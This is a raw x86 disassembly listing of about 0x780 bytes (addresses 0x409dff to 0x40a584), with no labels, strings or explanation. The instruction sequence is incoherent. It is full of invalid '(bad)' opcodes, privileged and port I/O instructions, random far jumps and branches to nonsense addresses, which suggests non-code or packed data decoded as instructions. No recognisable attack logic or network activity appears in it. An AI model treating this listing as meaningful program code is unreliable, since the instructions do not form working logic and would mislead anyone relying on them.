  409dff:	dec    esp
  409e00:	xchg   esi,eax
  409e01:	sub    bh,0x7b
  409e04:	fmul   DWORD PTR [edx+0x325f099f]
  409e0a:	and    al,0x8b
  409e0c:	cmp    DWORD PTR [esi-0x69277925],edi
  409e12:	jo     0x409d96
  409e14:	rol    DWORD PTR [edi+0x6a],1
  409e17:	jl     0x409e55
  409e19:	les    esp,FWORD PTR [edx]
  409e1b:	and    dh,BYTE PTR ds:0x8d37c07d
  409e21:	icebp  
  409e22:	rol    DWORD PTR [ecx],0x52
  409e25:	in     eax,dx
  409e26:	xchg   DWORD PTR [esi+0x54],ecx
  409e29:	repnz lds edi,FWORD PTR [eax-0x7eb0839f]
  409e30:	mov    ebx,0x59f5376e
  409e35:	jmp    0xe5d1:0x4353bcc1
  409e3c:	push   0x77
  409e3e:	sub    al,0x35
  409e40:	(bad)  
  409e41:	lods   al,BYTE PTR ds:[esi]
  409e42:	je     0x409ea5
  409e44:	add    eax,0x6ddaf8b6
  409e49:	adc    dh,BYTE PTR [edx]
  409e4b:	dec    edx
  409e4c:	ins    BYTE PTR es:[edi],dx
  409e4d:	xor    al,0xf8
  409e4f:	dec    ebp
  409e50:	fbld   TBYTE PTR [eax]
  409e52:	pop    edi
  409e53:	imul   ecx,DWORD PTR [eax+0x76ce198c],0x176faf09
  409e5d:	sbb    al,0x91
  409e5f:	dec    esp
  409e60:	push   esp
  409e61:	cmp    esi,DWORD PTR [esi+0x21]
  409e64:	inc    eax
  409e65:	push   ebp
  409e66:	cmp    ch,BYTE PTR [eax+0x55]
  409e69:	adc    edx,DWORD PTR [edi+0x449e5a3a]
  409e6f:	xchg   edi,eax
  409e70:	mov    bl,BYTE PTR [eax+0x78332db8]
  409e76:	pusha  
  409e77:	imul   edx,DWORD PTR [esi],0x8955fe1
  409e7d:	push   ecx
  409e7e:	sub    eax,0xac587c9
  409e83:	xor    cl,bh
  409e85:	jl     0x409e56
  409e87:	mov    al,0xe3
  409e89:	int    0x86
  409e8b:	push   ecx
  409e8c:	pop    ebx
  409e8d:	dec    edx
  409e8e:	jmp    0xa4b0421c
  409e93:	dec    ecx
  409e94:	adc    DWORD PTR [eax-0x64],eax
  409e97:	pusha  
  409e98:	call   0x118e97aa
  409e9d:	xchg   DWORD PTR [eax+0x7db91a68],edi
  409ea3:	add    ah,cl
  409ea5:	mov    ebp,0x46ea36fe
  409eaa:	cmp    dl,BYTE PTR [ebx]
  409eac:	xchg   edx,eax
  409ead:	jmp    FWORD PTR [edx-0x68554f29]
  409eb3:	xor    edx,DWORD PTR [edi]
  409eb5:	clc    
  409eb6:	lock adc al,0xa3
  409eb9:	out    dx,al
  409eba:	mov    DWORD PTR [ecx],ebx
  409ebc:	call   0xcacd06d2
  409ec1:	repz (bad) 
  409ec3:	les    eax,FWORD PTR [ecx-0x6980f72a]
  409ec9:	xchg   edx,eax
  409eca:	push   ebp
  409ecb:	jl     0x409f1e
  409ecd:	push   esi
  409ece:	add    dh,cl
  409ed0:	mov    bl,0xa7
  409ed2:	shr    BYTE PTR [edx+eax*2],0xbb
  409ed6:	adc    al,0xf0
  409ed8:	ds into 
  409eda:	mov    ch,0xc9
  409edc:	add    BYTE PTR [esi+ecx*4+0x1c6e0207],al
  409ee3:	or     BYTE PTR [ebp-0x7b],dl
  409ee6:	sbb    al,0x57
  409ee8:	je     0x409f0a
  409eea:	pop    edi
  409eeb:	xor    BYTE PTR [ebx-0x9c2d385],ch
  409ef1:	sub    ebx,edi
  409ef3:	cmp    ebx,edx
  409ef5:	mov    dl,0x8a
  409ef7:	pop    es
  409ef8:	cli    
  409ef9:	sub    ah,dl
  409efb:	dec    ecx
  409efc:	in     eax,0xb1
  409efe:	xor    BYTE PTR [edi-0x7aa52e72],ch
  409f04:	mov    bh,0xf
  409f06:	xchg   ebx,eax
  409f07:	jmp    0x409eb7
  409f09:	add    ebp,DWORD PTR [ebx*2+0x69092e71]
  409f10:	push   ebp
  409f11:	pop    ebx
  409f12:	jg     0x409f6d
  409f14:	sub    ah,BYTE PTR [edi+0x4]
  409f17:	push   esp
  409f18:	xchg   ebp,eax
  409f19:	(bad)  
  409f1b:	fdiv   QWORD PTR [ebx-0x60]
  409f1e:	push   ebp
  409f1f:	jecxz  0x409ea1
  409f21:	xchg   ecx,eax
  409f22:	ret    0xfb40
  409f25:	mov    al,ds:0xe3428ca8
  409f2a:	dec    ebp
  409f2b:	and    bh,BYTE PTR [ebx-0x4a2b62b5]
  409f31:	(bad)  
  409f32:	dec    esp
  409f33:	push   0x6d1e99c1
  409f38:	(bad)  
  409f3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f3b:	pop    esp
  409f3c:	mov    eax,ds:0x5cd7c185
  409f41:	jae    0x409f69
  409f43:	int3   
  409f44:	and    ebp,ebp
  409f46:	cmp    eax,0xc89ce95b
  409f4b:	pop    edi
  409f4c:	int    0xe9
  409f4e:	cmp    ch,bl
  409f50:	(bad)  
  409f51:	jae    0x409f23
  409f53:	hlt    
  409f54:	pusha  
  409f55:	lods   eax,DWORD PTR ds:[esi]
  409f56:	lods   eax,DWORD PTR ds:[esi]
  409f57:	push   eax
  409f58:	xor    ah,BYTE PTR [edi+0x68dfc4f6]
  409f5e:	aad    0xc
  409f60:	ficom  DWORD PTR [eax-0x60715c42]
  409f66:	xchg   ecx,eax
  409f67:	inc    eax
  409f68:	inc    ecx
  409f69:	sbb    al,0xd9
  409f6b:	xor    DWORD PTR [ecx],0xb59a0f6d
  409f71:	xchg   ebx,eax
  409f72:	retf   
  409f73:	sti    
  409f74:	int    0x1f
  409f76:	ss pop ds
  409f78:	lods   eax,DWORD PTR ds:[esi]
  409f79:	retf   0x6b55
  409f7c:	xor    ch,al
  409f7e:	xchg   BYTE PTR [edx],al
  409f80:	jle    0x409f7f
  409f82:	aam    0x23
  409f84:	shl    ebx,1
  409f86:	cwde   
  409f87:	aam    0xd7
  409f89:	jne    0x409f9c
  409f8b:	mov    eax,ds:0xa1accd20
  409f91:	or     al,0xd9
  409f93:	pop    esp
  409f94:	sbb    eax,0xc5ef3170
  409f99:	pop    edi
  409f9a:	add    edx,edx
  409f9c:	mov    BYTE PTR [edi],ah
  409f9e:	aas    
  409f9f:	(bad)  
  409fa0:	sbb    DWORD PTR [ecx],esp
  409fa2:	and    BYTE PTR [edi-0x69004ada],dh
  409fa8:	stc    
  409fa9:	in     eax,dx
  409faa:	outs   dx,BYTE PTR ds:[esi]
  409fab:	cmp    ch,dl
  409fad:	dec    esp
  409fae:	shl    al,1
  409fb0:	jo     0x409f61
  409fb2:	scas   eax,DWORD PTR es:[edi]
  409fb3:	faddp  st(4),st
  409fb5:	xchg   DWORD PTR [edi-0x50],ebx
  409fb8:	pop    es
  409fb9:	mov    DWORD PTR [ecx+0x4e9345c1],0x883d5326
  409fc3:	xlat   BYTE PTR ds:[ebx]
  409fc4:	inc    esi
  409fc5:	and    BYTE PTR [edx+edi*1-0x44428aa6],ah
  409fcc:	push   edx
  409fcd:	and    DWORD PTR [edi+ecx*2+0x64],0xffffff86
  409fd2:	inc    ecx
  409fd3:	lock pop edx
  409fd5:	xchg   ecx,eax
  409fd6:	bnd jno 0x409f8c
  409fd9:	ltr    WORD PTR [edi-0x41]
  409fdd:	dec    edi
  409fde:	push   0x5027bd11
  409fe3:	call   0xe3f4cc60
  409fe8:	sbb    eax,0xf537109f
  409fed:	sub    al,0x4d
  409fef:	push   0xfffffff0
  409ff1:	sub    bh,0xb6
  409ff4:	hlt    
  409ff5:	nop
  409ff6:	push   cs
  409ff7:	imul   esi,DWORD PTR [edx+0x10],0xffffffcd
  409ffb:	ds pushf 
  409ffd:	cmp    bl,BYTE PTR [ebp-0x1cc46511]
  40a003:	jl     0x409fb3
  40a005:	push   esp
  40a006:	test   eax,0x6d773a34
  40a00b:	lods   al,BYTE PTR gs:[esi]
  40a00d:	cmp    DWORD PTR [ebx+eiz*2],edx
  40a010:	mov    ch,cl
  40a012:	push   es
  40a013:	rcr    BYTE PTR [eax],1
  40a015:	clc    
  40a016:	leave  
  40a017:	call   0xda5f4430
  40a01c:	btc    DWORD PTR fs:0x6d8e23cd,ecx
  40a024:	dec    bl
  40a026:	test   al,0x8c
  40a028:	sbb    DWORD PTR [eax+0x5f],ecx
  40a02b:	push   cs
  40a02c:	xchg   edi,eax
  40a02d:	int3   
  40a02e:	push   esi
  40a02f:	xchg   ebp,eax
  40a030:	aas    
  40a031:	outs   dx,BYTE PTR ds:[esi]
  40a032:	(bad)  
  40a034:	or     bl,BYTE PTR [ebx+0x13]
  40a037:	lods   al,BYTE PTR ds:[esi]
  40a038:	sub    edi,DWORD PTR [esi-0x713c8910]
  40a03e:	daa    
  40a03f:	mov    al,0xcf
  40a041:	(bad)  
  40a042:	mov    esp,es
  40a044:	pop    edi
  40a045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a046:	xchg   ecx,eax
  40a047:	dec    ebx
  40a048:	call   0x4c631f71
  40a04d:	mov    bh,0x31
  40a04f:	leave  
  40a050:	push   esp
  40a051:	dec    esp
  40a052:	and    eax,0x6de5b8cc
  40a057:	ficomp DWORD PTR [esi+0x45]
  40a05a:	outs   dx,BYTE PTR ds:[esi]
  40a05b:	out    0x20,al
  40a05d:	test   ah,al
  40a05f:	inc    eax
  40a060:	iret   
  40a061:	dec    eax
  40a062:	or     bh,BYTE PTR [edx+esi*4]
  40a065:	fnstenv [ebp+0x4addecaa]
  40a06b:	mov    eax,ds:0x9acaad93
  40a070:	mov    dl,0x77
  40a072:	xchg   ebp,eax
  40a073:	or     ecx,DWORD PTR [edi-0x52dc8162]
  40a079:	cmc    
  40a07a:	outs   dx,DWORD PTR ds:[esi]
  40a07b:	mov    ecx,ss
  40a07d:	adc    eax,0xbc937aec
  40a082:	jmp    DWORD PTR [eax]
  40a084:	sbb    eax,0xf2bf60b7
  40a089:	lods   eax,DWORD PTR ds:[esi]
  40a08a:	and    ebp,esi
  40a08c:	jmp    0x40a077
  40a08e:	jg     0x40a0d8
  40a090:	loop   0x40a07c
  40a092:	push   ebx
  40a093:	sbb    al,dh
  40a095:	cli    
  40a096:	cmp    DWORD PTR [ecx+eiz*4-0x4a],edx
  40a09a:	xchg   esp,eax
  40a09b:	loop   0x40a02a
  40a09d:	or     al,0x44
  40a09f:	or     eax,0x6bb8791
  40a0a4:	fs jle 0x40a0ce
  40a0a7:	mov    eax,ds:0xdfbbd42e
  40a0ac:	mov    edi,0x28182fb5
  40a0b1:	outs   dx,BYTE PTR ds:[esi]
  40a0b2:	fcomp  QWORD PTR [ecx+0x6e541e13]
  40a0b8:	jne    0x40a042
  40a0ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0bb:	lahf   
  40a0bc:	sub    BYTE PTR [edi+0x25db1a1a],bh
  40a0c2:	pop    edx
  40a0c3:	shr    ebp,1
  40a0c5:	inc    esp
  40a0c6:	lds    eax,FWORD PTR [eax+eiz*2]
  40a0c9:	jo     0x40a092
  40a0cb:	out    dx,eax
  40a0cc:	outs   dx,DWORD PTR cs:[esi]
  40a0ce:	hlt    
  40a0cf:	jns    0x40a0c8
  40a0d1:	xchg   esp,eax
  40a0d2:	jle    0x40a0dd
  40a0d4:	test   BYTE PTR [edi-0x62],0x5a
  40a0d8:	cld    
  40a0d9:	test   eax,0xd384fa50
  40a0de:	dec    eax
  40a0df:	or     DWORD PTR [ebx+ebx*2],esp
  40a0e2:	test   al,0x43
  40a0e4:	cwde   
  40a0e5:	je     0x40a0e8
  40a0e7:	in     eax,dx
  40a0e8:	cli    
  40a0e9:	sti    
  40a0ea:	or     BYTE PTR [edx+esi*8],ch
  40a0ed:	pop    edi
  40a0ee:	jne    0x40a0b4
  40a0f0:	cwde   
  40a0f1:	push   edx
  40a0f2:	adc    dl,BYTE PTR fs:[ebx-0x76]
  40a0f6:	test   ebp,0x73b8fedc
  40a0fc:	js     0x40a0c4
  40a0fe:	push   ds
  40a0ff:	retf   
  40a100:	fiadd  DWORD PTR [edx+ebp*4-0x2f]
  40a104:	stos   BYTE PTR es:[edi],al
  40a105:	shl    cl,1
  40a107:	sbb    DWORD PTR [edx],esi
  40a109:	repnz dec esp
  40a10b:	inc    ebx
  40a10c:	loop   0x40a171
  40a10e:	into   
  40a10f:	jno    0x40a0fb
  40a111:	pop    esi
  40a112:	retf   0xac9d
  40a115:	hlt    
  40a116:	and    eax,0xc943cf76
  40a11b:	pop    ecx
  40a11c:	ss sub eax,0xf0f16a70
  40a122:	and    eax,0x4cb8f16f
  40a127:	test   eax,0xfcb0b6d3
  40a12c:	ss xchg esp,eax
  40a12e:	cdq    
  40a12f:	push   ecx
  40a130:	(bad)  
  40a131:	mov    esp,0x252b8d76
  40a136:	fcmovnbe st,st(0)
  40a138:	adc    eax,ecx
  40a13a:	xlat   BYTE PTR ds:[ebx]
  40a13b:	cdq    
  40a13c:	jge    0x40a161
  40a13e:	retf   
  40a13f:	sub    DWORD PTR [ebp+0x7c5bdb0f],esi
  40a145:	lahf   
  40a146:	dec    ebx
  40a147:	xor    BYTE PTR [ecx+ebx*4+0x5bb3df1],dh
  40a14e:	push   es
  40a14f:	push   edi
  40a150:	leave  
  40a151:	xor    esp,DWORD PTR [edi+0x7c]
  40a154:	xor    DWORD PTR ds:0x8a3ae598,esi
  40a15a:	mov    bl,0x4d
  40a15c:	xchg   ecx,eax
  40a15d:	push   ebp
  40a15e:	push   ecx
  40a15f:	jo     0x40a131
  40a161:	fadd   st(6),st
  40a163:	mov    ds:0x410edd19,eax
  40a168:	xlat   BYTE PTR ds:[ebx]
  40a169:	daa    
  40a16a:	int    0x56
  40a16c:	mov    esp,0xed6fc537
  40a171:	gs pusha 
  40a173:	aaa    
  40a174:	(bad)  
  40a175:	cmc    
  40a176:	mov    ebx,0x2f4d49a
  40a17b:	cmp    eax,0x613ce362
  40a180:	add    DWORD PTR [ebp+eax*1+0x76],esp
  40a184:	sub    DWORD PTR [esp+ecx*4-0x1ba41792],eax
  40a18b:	cwde   
  40a18c:	ins    DWORD PTR es:[edi],dx
  40a18d:	daa    
  40a18e:	push   ecx
  40a18f:	aaa    
  40a190:	mov    eax,ds:0x343affca
  40a195:	lock (bad) 
  40a197:	mov    al,0x50
  40a199:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a19a:	or     ecx,DWORD PTR [esi-0x35]
  40a19d:	dec    eax
  40a19e:	sub    BYTE PTR [eax+0x13],0x43
  40a1a2:	bound  ebx,QWORD PTR [ecx+0x20]
  40a1a5:	clc    
  40a1a6:	mov    eax,ds:0xe1bbb97a
  40a1ab:	lds    ecx,FWORD PTR [ebp-0x1b]
  40a1ae:	cmp    ch,BYTE PTR [edx]
  40a1b0:	push   ss
  40a1b1:	bound  ebx,QWORD PTR [ebx]
  40a1b3:	mov    al,ds:0x68bbba8
  40a1b8:	das    
  40a1b9:	and    bl,dh
  40a1bb:	lock mov esi,0x1f0d217b
  40a1c1:	pop    ds
  40a1c2:	(bad)  
  40a1c3:	adc    eax,0xe7440410
  40a1c8:	cmp    al,0x84
  40a1ca:	and    edx,ebp
  40a1cc:	pushf  
  40a1cd:	xor    al,0x3c
  40a1cf:	mov    ch,0xb1
  40a1d1:	cmp    eax,0xd76b05b5
  40a1d6:	out    dx,eax
  40a1d7:	mov    bh,0x6a
  40a1d9:	lock test al,0x1
  40a1dc:	xchg   al,dl
  40a1de:	aad    0xc1
  40a1e0:	retf   0x2735
  40a1e3:	sbb    al,BYTE PTR [edx]
  40a1e5:	inc    ebx
  40a1e6:	jge    0x40a183
  40a1e8:	not    bh
  40a1ea:	cwde   
  40a1eb:	sbb    ecx,DWORD PTR [ecx-0x28]
  40a1ee:	add    eax,0xe58cde48
  40a1f3:	push   ss
  40a1f4:	scas   al,BYTE PTR es:[edi]
  40a1f5:	test   eax,0xfacaff09
  40a1fa:	adc    edx,DWORD PTR [ebp*2-0x7fc66ab2]
  40a201:	mov    bl,0x12
  40a203:	mov    ebp,0x5b5acb6c
  40a208:	mov    ebp,0xbc42630b
  40a20d:	int3   
  40a20e:	outs   dx,DWORD PTR ds:[esi]
  40a20f:	mov    eax,0x31aaac1a
  40a214:	add    DWORD PTR [edi],ecx
  40a216:	inc    esp
  40a217:	or     BYTE PTR [ecx],cl
  40a219:	neg    esi
  40a21b:	repnz nop
  40a21d:	mov    BYTE PTR [edx+0x7af0442],dl
  40a223:	jmp    0xd36:0x955b1011
  40a22a:	lahf   
  40a22b:	leave  
  40a22c:	add    ah,BYTE PTR [eax]
  40a22e:	mov    ch,BYTE PTR [edi+0x19]
  40a231:	sti    
  40a232:	ins    DWORD PTR es:[edi],dx
  40a233:	mov    al,0xb4
  40a235:	or     BYTE PTR [edi+ebp*1-0x66f53d2e],ch
  40a23c:	cmp    al,0x35
  40a23e:	ret    0x8e4b
  40a241:	and    bh,BYTE PTR [esi+0x7db66897]
  40a247:	shl    BYTE PTR [esi],0x46
  40a24a:	test   BYTE PTR [ecx-0x32],bh
  40a24d:	aam    0x70
  40a24f:	dec    ebp
  40a250:	ret    0x9e63
  40a253:	and    al,0xb7
  40a255:	mov    WORD PTR [eax+0x269e2b96],gs
  40a25b:	cwde   
  40a25c:	pop    esp
  40a25d:	inc    esp
  40a25e:	fisttp WORD PTR [ecx+esi*8+0x33174fb3]
  40a265:	rcr    cl,0x97
  40a268:	sub    esp,DWORD PTR [ebx]
  40a26a:	nop
  40a26b:	sbb    DWORD PTR [eax],edx
  40a26d:	mov    eax,ds:0x326be54e
  40a272:	pusha  
  40a273:	mov    bl,0x57
  40a275:	mov    esp,0x520f3e56
  40a27a:	dec    esi
  40a27b:	pop    edx
  40a27c:	mov    bh,0x92
  40a27e:	fist   DWORD PTR [edi+ebp*8+0x7b]
  40a282:	fnstsw WORD PTR [eax+0x7f626f87]
  40a288:	scas   al,BYTE PTR es:[edi]
  40a289:	(bad)  
  40a28b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a28c:	sub    al,0xd1
  40a28e:	mov    cl,0x88
  40a290:	clc    
  40a291:	push   eax
  40a292:	ret    
  40a293:	xor    eax,ecx
  40a295:	cmp    ebp,DWORD PTR [edi-0x2a57bd15]
  40a29b:	loopne 0x40a26a
  40a29d:	dec    ebx
  40a29e:	inc    esi
  40a29f:	iret   
  40a2a0:	xor    esi,0x39
  40a2a3:	mov    ch,0x82
  40a2a5:	dec    ebp
  40a2a6:	sahf   
  40a2a7:	out    dx,al
  40a2a8:	sahf   
  40a2a9:	mov    DWORD PTR [ebp+0x733fe6ab],edx
  40a2af:	ficomp WORD PTR [edi-0x7a132e1b]
  40a2b5:	int    0xc
  40a2b7:	or     al,0x2b
  40a2b9:	cli    
  40a2ba:	aad    0x74
  40a2bc:	adc    al,0xef
  40a2be:	scas   al,BYTE PTR es:[edi]
  40a2bf:	mov    DWORD PTR [eax],edi
  40a2c1:	cs jg  0x40a307
  40a2c4:	and    esi,ebx
  40a2c6:	pop    ecx
  40a2c7:	das    
  40a2c8:	cdq    
  40a2c9:	dec    edx
  40a2ca:	inc    ecx
  40a2cb:	xchg   ebx,eax
  40a2cc:	je     0x40a260
  40a2ce:	push   edx
  40a2cf:	pop    eax
  40a2d0:	mov    ds:0x52ed90ae,al
  40a2d5:	jmp    0x6a0b8f40
  40a2da:	imul   ebx,DWORD PTR [ebx],0xffffffec
  40a2dd:	mov    al,0xfc
  40a2df:	pop    es
  40a2e0:	sbb    ch,BYTE PTR [ebx]
  40a2e2:	jb     0x40a343
  40a2e4:	rcl    BYTE PTR [edi],cl
  40a2e6:	mov    ebp,0x10d49d96
  40a2eb:	fstp   DWORD PTR [esi]
  40a2ed:	dec    edi
  40a2ee:	push   ds
  40a2ef:	(bad)  
  40a2f0:	jno    0x40a286
  40a2f2:	push   ecx
  40a2f3:	test   BYTE PTR [edx+0x73],al
  40a2f6:	adc    DWORD PTR [edx+0x6e],esp
  40a2f9:	int3   
  40a2fa:	xor    dh,al
  40a2fc:	mov    ch,0x3a
  40a2fe:	dec    esi
  40a2ff:	xchg   ecx,eax
  40a300:	jp     0x40a32a
  40a302:	xor    ecx,esp
  40a304:	fcom   st(2)
  40a306:	or     DWORD PTR [eax],0x1dbab20c
  40a30c:	and    eax,esi
  40a30e:	jo     0x40a32a
  40a310:	outs   dx,BYTE PTR ds:[esi]
  40a311:	iret   
  40a312:	ja     0x40a38b
  40a314:	add    bh,BYTE PTR [edx+0x53806ba1]
  40a31a:	in     al,dx
  40a31b:	call   0x3216f307
  40a320:	jg     0x40a36b
  40a322:	sub    ah,bl
  40a324:	inc    esp
  40a325:	call   0xea5:0xa4c6c5f
  40a32c:	test   al,0x48
  40a32e:	pop    ecx
  40a32f:	push   edi
  40a330:	adc    eax,0x96bf028
  40a335:	xor    DWORD PTR [ecx-0x2f],esi
  40a338:	je     0x40a327
  40a33a:	sbb    al,0x23
  40a33c:	mov    eax,0x96f01edc
  40a341:	popf   
  40a342:	ret    0xa85d
  40a345:	out    dx,eax
  40a346:	leave  
  40a347:	cdq    
  40a348:	in     eax,0xa1
  40a34a:	push   edi
  40a34b:	(bad)  [edi]
  40a34d:	cmp    al,0x46
  40a34f:	ret    
  40a350:	dec    ecx
  40a351:	mov    al,0x2e
  40a353:	lea    eax,[edx-0x64579b09]
  40a359:	cmp    ebx,DWORD PTR [ecx]
  40a35b:	xor    al,0x9a
  40a35d:	enter  0xfa28,0x3d
  40a361:	movntq QWORD PTR [ebp-0x49c3e8b4],mm6
  40a368:	pop    edx
  40a369:	mov    edx,0xdcaf98ba
  40a36e:	out    0xce,eax
  40a370:	and    eax,0x8bc65638
  40a375:	push   ecx
  40a376:	jne    0x40a3d9
  40a378:	das    
  40a379:	or     eax,0xea8f5528
  40a37e:	sbb    eax,DWORD PTR [ecx-0x72]
  40a381:	xor    al,0x35
  40a383:	jle    0xed9a3b8e
  40a389:	rcr    DWORD PTR cs:[ebp+0x14],1
  40a38d:	sub    bl,BYTE PTR [esp+ecx*1]
  40a390:	mov    ch,0x81
  40a392:	pop    ds
  40a393:	xchg   ebp,eax
  40a394:	shl    esp,0xfe
  40a397:	adc    esi,DWORD PTR [ebx-0x37]
  40a39a:	nop
  40a39b:	in     eax,0xce
  40a39d:	cld    
  40a39e:	mov    eax,DWORD PTR [edi]
  40a3a0:	ret    
  40a3a1:	imul   ebx,esp,0x3e2b9c19
  40a3a7:	nop
  40a3a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3a9:	xchg   BYTE PTR [ebp-0x41d1055],ah
  40a3af:	push   ds
  40a3b0:	scas   eax,DWORD PTR es:[edi]
  40a3b1:	jmp    0x9e9f:0xc07470e0
  40a3b8:	xor    al,0x85
  40a3ba:	aaa    
  40a3bb:	jg     0x40a39f
  40a3bd:	mov    ch,0x8
  40a3bf:	inc    ebp
  40a3c0:	ss xor al,0xe6
  40a3c3:	mov    dh,0xbe
  40a3c5:	addr16 cli 
  40a3c7:	outs   dx,BYTE PTR ds:[esi]
  40a3c8:	ficomp DWORD PTR [edx+0x734da91a]
  40a3ce:	cmp    eax,0xc7b5ad06
  40a3d3:	repz mov edi,esp
  40a3d6:	adc    esi,DWORD PTR [edx-0x18]
  40a3d9:	test   eax,esp
  40a3db:	xacquire xchg BYTE PTR [esi],al
  40a3de:	(bad)  
  40a3df:	das    
  40a3e0:	ret    0xab2a
  40a3e3:	ds sbb eax,0x3a63efe5
  40a3ea:	int    0xba
  40a3ec:	xor    bl,dl
  40a3ee:	loop   0x40a428
  40a3f0:	cmp    eax,0xf8414e94
  40a3f5:	push   esi
  40a3f6:	fild   WORD PTR [eax-0x40]
  40a3f9:	inc    ebx
  40a3fa:	loope  0x40a3b3
  40a3fc:	cli    
  40a3fd:	shr    eax,0xff
  40a400:	add    al,0xf1
  40a402:	sbb    DWORD PTR [ebx+0x3d],edx
  40a405:	adc    bh,0xf8
  40a408:	faddp  st(3),st
  40a40a:	or     al,0x6d
  40a40c:	xchg   edx,eax
  40a40d:	xchg   BYTE PTR [eax-0x14],bh
  40a410:	xchg   BYTE PTR ds:0x6e3757e7,al
  40a416:	xchg   edi,eax
  40a417:	(bad)  
  40a418:	jecxz  0x40a43f
  40a41a:	sub    al,0x4f
  40a41c:	or     al,0xcc
  40a41e:	sbb    eax,0xf295d373
  40a423:	ret    
  40a424:	xor    edx,DWORD PTR [ebx]
  40a426:	jmp    0x40a429
  40a428:	adc    edx,ebp
  40a42a:	or     ebp,DWORD PTR [ecx+0x6008d1eb]
  40a430:	sbb    ecx,DWORD PTR [eax+eax*1]
  40a433:	out    dx,eax
  40a434:	push   esi
  40a435:	pop    ecx
  40a436:	js     0x40a46d
  40a438:	jp     0x40a40c
  40a43a:	push   ds
  40a43b:	jns    0x40a4a7
  40a43d:	sbb    eax,0x1f721618
  40a442:	xchg   ebp,eax
  40a443:	xchg   cl,cl
  40a445:	jns    0x40a3f7
  40a447:	test   esp,ecx
  40a449:	push   ss
  40a44a:	dec    esi
  40a44b:	add    edx,ebx
  40a44d:	pop    esp
  40a44e:	int    0xe2
  40a450:	sub    ch,BYTE PTR [ebx+0x7a]
  40a453:	mov    ecx,0xbe657a98
  40a458:	dec    eax
  40a459:	dec    edx
  40a45a:	xchg   esi,eax
  40a45b:	jne    0x40a46d
  40a45d:	jecxz  0x40a4d9
  40a45f:	jb     0x40a434
  40a461:	mov    edi,0xd5364b99
  40a466:	mov    esp,0x5372b31d
  40a46b:	mov    ebp,0xd7c5b6dd
  40a470:	fcomp  DWORD PTR ds:0x4ece7b62
  40a476:	sahf   
  40a477:	retf   
  40a478:	sub    DWORD PTR [ebp-0x57],ecx
  40a47b:	scas   eax,DWORD PTR es:[edi]
  40a47c:	xchg   DWORD PTR [ebp-0x74c902fa],eax
  40a482:	bound  esp,QWORD PTR [esi+0x34]
  40a485:	push   ebp
  40a486:	jl     0x40a4c5
  40a488:	xor    BYTE PTR [ebx+0x4d99d5d6],0x40
  40a48f:	outs   dx,DWORD PTR ds:[esi]
  40a490:	jbe    0x40a455
  40a492:	lahf   
  40a493:	mov    esp,0xe20ed186
  40a498:	push   0x4d
  40a49a:	jne    0x40a4e7
  40a49c:	iret   
  40a49d:	lahf   
  40a49e:	fldenv [esi+edx*1+0xa9335a0]
  40a4a5:	out    dx,eax
  40a4a6:	int    0x71
  40a4a8:	mov    al,ds:0xf485d1ce
  40a4ad:	retf   
  40a4ae:	dec    edi
  40a4af:	fsub   QWORD PTR [esi]
  40a4b1:	outs   dx,BYTE PTR ds:[esi]
  40a4b2:	dec    esp
  40a4b3:	mov    dh,0x8a
  40a4b5:	and    al,0xdb
  40a4b7:	out    0xf6,eax
  40a4b9:	push   0x5754fff
  40a4be:	dec    esp
  40a4bf:	call   0x9b67:0x31e66888
  40a4c6:	sub    BYTE PTR [ebx-0x28],0x2c
  40a4ca:	push   ss
  40a4cb:	add    DWORD PTR [esi+0x69],edx
  40a4ce:	push   esp
  40a4cf:	pop    edx
  40a4d0:	enter  0x2c1b,0x23
  40a4d4:	shl    BYTE PTR [ecx+0x14],cl
  40a4d7:	stc    
  40a4d8:	mov    esi,0x8f56b40b
  40a4dd:	mov    cs,esp
  40a4df:	std    
  40a4e0:	xchg   ecx,eax
  40a4e1:	mov    BYTE PTR [edx+0xd],dl
  40a4e4:	mov    edi,0xc35d8ea1
  40a4e9:	push   0x1a
  40a4eb:	mov    bl,0x8
  40a4ed:	pop    es
  40a4ee:	cmp    eax,0xbce076c3
  40a4f3:	mov    ds:0x651b150a,al
  40a4f8:	xchg   ebx,eax
  40a4f9:	jp     0x40a4d9
  40a4fb:	or     al,BYTE PTR [ebx]
  40a4fd:	ficomp WORD PTR [edx]
  40a4ff:	dec    ecx
  40a500:	leave  
  40a501:	ins    BYTE PTR es:[edi],dx
  40a502:	cmp    cl,BYTE PTR ds:0xab302d4d
  40a508:	rcr    BYTE PTR [ecx+0x5e7d79ce],cl
  40a50e:	je     0x40a529
  40a510:	jo     0x40a556
  40a512:	and    al,0xc3
  40a514:	aas    
  40a515:	xlat   BYTE PTR ds:[ebx]
  40a516:	mov    al,0x10
  40a518:	or     dh,bl
  40a51a:	jmp    0x40a4ef
  40a51c:	mov    ah,0x57
  40a51e:	sub    dl,BYTE PTR ds:0x96b09a58
  40a524:	pop    esi
  40a525:	call   ebx
  40a527:	int    0x4b
  40a529:	mov    al,0x17
  40a52b:	or     cl,ch
  40a52d:	xor    edi,ebp
  40a52f:	scas   al,BYTE PTR es:[edi]
  40a530:	iret   
  40a531:	mov    edx,0xde57904b
  40a536:	stos   BYTE PTR es:[edi],al
  40a537:	popf   
  40a538:	mov    ah,0xda
  40a53a:	or     ah,BYTE PTR [eax+0x43]
  40a53d:	xchg   edx,eax
  40a53e:	or     al,0x69
  40a540:	nop
  40a541:	add    BYTE PTR [ebp-0x16],ah
  40a544:	adc    bl,BYTE PTR [eax+ebp*1]
  40a547:	adc    ebx,DWORD PTR [ebx+0x3a62cf56]
  40a54d:	pop    ebp
  40a54e:	call   0x73d6:0x9a741ce4
  40a555:	hlt    
  40a556:	arpl   WORD PTR [ebx-0x1ccea704],bx
  40a55c:	aas    
  40a55d:	pop    eax
  40a55e:	fwait
  40a55f:	mov    esi,0x77efcaa9
  40a564:	sbb    bh,BYTE PTR [ecx]
  40a566:	cmc    
  40a567:	js     0x40a5c5
  40a569:	inc    ecx
  40a56a:	jle    0x40a5a0
  40a56c:	shl    BYTE PTR [ebp-0x65186f6d],cl
  40a572:	mov    ebp,0xa6728d14
  40a577:	cdq    
  40a578:	pop    edi
  40a579:	sub    edi,DWORD PTR fs:[edx+eax*8+0x1d050651]
  40a581:	or     esi,ebp
  40a583:	xchg   esp,eax
  40a584:	dec    eax
